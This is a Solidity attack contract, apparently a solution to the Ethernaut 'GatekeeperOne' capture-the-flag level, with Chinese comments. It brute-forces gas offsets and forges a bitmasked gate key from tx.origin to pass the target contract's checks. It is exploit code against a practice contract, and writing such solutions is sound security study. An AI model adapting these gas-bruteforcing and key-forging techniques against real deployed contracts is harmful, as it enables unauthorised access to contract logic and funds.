// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

interface IGatekeeperOne {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneAttack {
    // 在合約內暴力嘗試 gas 偏移，單筆交易完成破解
    function solve(address _target, bytes8 _gateKey, uint256 _rangeStart, uint256 _rangeEnd) external {
        uint256 base = 8191 * 10;
        for (uint256 i = _rangeStart; i <= _rangeEnd; i++) {
            (bool success, ) = _target.call{gas: base + i}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            if (success) {
                console.log("Success with gas offset:", i);
                return;
            }
        }

        revert("All gas offsets failed in range");
    }

    // 這裡我們把 enter 寫成一個可以傳入特定 gas 的函式
    function attack(address _target, uint256 _gasToTry) public returns (bool) {
        // Gate 3 邏輯：構造符合條件的 Key
        // 1. 保留地址末 2 bytes (uint16)
        // 2. 確保中間 2 bytes 是 0
        // 3. 確保前 4 bytes 不是 0 (所以用 0xFFFFFFFF)
        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        IGatekeeperOne gate = IGatekeeperOne(_target);

        (bool success, ) = _target.call{gas: _gasToTry}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        
        
        if (success && gate.entrant() == tx.origin) {
            return true;
        }
        return false;
    }
}
